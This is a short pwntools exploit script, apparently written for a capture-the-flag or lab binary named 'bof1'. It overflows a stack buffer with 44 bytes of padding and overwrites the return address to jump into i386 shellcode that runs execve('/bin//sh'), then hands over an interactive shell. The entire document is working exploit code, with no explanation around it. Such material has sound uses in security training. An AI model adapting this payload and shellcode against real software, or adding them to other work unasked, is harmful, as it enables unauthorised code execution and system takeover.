from pwn import *
context(os='linux', arch='i386')

filename='bof1'
p = process("./"+filename)
elf=ELF(filename)

shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

buffer=0x804a060

payload=''
payload+='A'*44
payload+=p32(buffer+44+4)
payload+=shellcode

p.sendline(payload)

p.interactive()
